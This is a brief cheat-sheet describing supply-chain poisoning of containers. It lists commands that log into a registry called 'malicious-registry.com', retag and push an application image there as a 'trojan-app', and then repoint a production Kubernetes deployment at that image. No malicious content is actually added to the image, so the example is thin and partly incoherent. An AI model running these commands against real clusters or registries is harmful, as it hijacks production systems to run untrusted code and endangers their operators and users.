# Supply Chain Poisoning

#### 1) Poisoning a container registry

    docker login -u attacker -p password malicious-registry.com

    docker tag legitimate-app:v1.0 malicious-registry.com/trojan-app:v1.0

    docker push malicious-registry.com/trojan-app:v1.0

#### 2)  Deploying the Trojan horse

    kubectl set image deployment/production-app app=malicious-registry.com/trojan-app:v1.0
